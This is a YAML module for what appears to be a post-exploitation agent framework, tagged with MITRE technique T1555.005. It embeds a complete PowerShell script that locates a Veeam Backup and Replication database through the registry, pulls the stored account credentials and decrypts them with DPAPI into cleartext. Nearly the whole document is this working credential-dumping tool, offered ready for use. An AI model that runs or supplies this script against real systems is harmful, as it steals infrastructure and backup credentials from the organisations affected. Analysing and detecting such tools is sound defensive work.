name: Invoke-VeeamGetCreds

authors:
  - name: ''
    handle: '@sadshade'
    link: ''
description: A PowerShell script for getting and decrypting accounts directly from the Veeam's database.

software:

tactics: []
techniques:
  - T1555.005

background: false

output_extension:

needs_admin: true

opsec_safe: true

language: powershell

min_language_version: '2'

comments:
  - https://github.com/sadshade/veeam-creds

# Any options needed by the module, settable during runtime
options:
  # The 'Agent' option is the only one that MUST be in a module
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
  - name: OutputFunction
    description: PowerShell's output function to use ("Out-String", "ConvertTo-Json", "ConvertTo-Csv", "ConvertTo-Html"").
    required: false
    value: Out-String
    strict: false
    suggested_values:
      - Out-String
      - ConvertTo-Json
      - ConvertTo-Csv
      - ConvertTo-Html

script: |
  function Invoke-VeeamGetCreds {

  Add-Type -assembly System.Security

  #Searching for connection parameters in the registry
  try {
   $VeaamRegPath = "HKLM:\SOFTWARE\Veeam\Veeam Backup and Replication\"
   $SqlDatabaseName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlDatabaseName 
   $SqlInstanceName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlInstanceName
   $SqlServerName = (Get-ItemProperty -Path $VeaamRegPath -ErrorAction Stop).SqlServerName
  }
  catch {
   "Can't find Veeam on localhost, try running as Administrator"
   exit -1
  }

  ""
  "Found Veeam DB on "+$SqlServerName+"\"+$SqlInstanceName+"@"+$SqlDatabaseName+", connecting...  "

  #Forming the connection string
  $SQL = "SELECT [user_name] AS 'User Name',[password] AS 'Password' FROM [$SqlDatabaseName].[dbo].[Credentials] WHERE password <> ''"
  $auth = "Integrated Security=SSPI;" #Local user
  $connectionString = "Provider=sqloledb; Data Source=$SqlServerName\$SqlInstanceName; " +
   "Initial Catalog=$SqlDatabaseName; $auth; "
  $connection = New-Object System.Data.OleDb.OleDbConnection $connectionString
  $command = New-Object System.Data.OleDb.OleDbCommand $SQL, $connection

  #Fetching encrypted credentials from the database
  try {
   $connection.Open()
   $adapter = New-Object System.Data.OleDb.OleDbDataAdapter $command
   $dataset = New-Object System.Data.DataSet
   [void] $adapter.Fill($dataSet)
   $connection.Close()
  }
  catch {
  "Can't connect to DB, exit."
   exit -1
  }

  "OK"
  $rows=($dataset.Tables | Select-Object -Expand Rows)
  if ($rows.count -eq 0) {
   "No passwords today, sorry."
  exit
  }

  ""
  "Here are some passwords for you, have fun:"
  ""
  #Decrypting passwords using DPAPI
  $rows | ForEach-Object -Process {
   $EnryptedPWD = [Convert]::FromBase64String($_.password)
   $ClearPWD = [System.Security.Cryptography.ProtectedData]::Unprotect( $EnryptedPWD, $null, [System.Security.Cryptography.DataProtectionScope]::LocalMachine )
   $enc = [system.text.encoding]::Default
   $_.password = $enc.GetString($ClearPWD)   
  }

  $rows

  }

script_end: Invoke-VeeamGetCreds | Select-Object "User Name", Password | {{ OUTPUT_FUNCTION }} | %{$_ + "`n"}
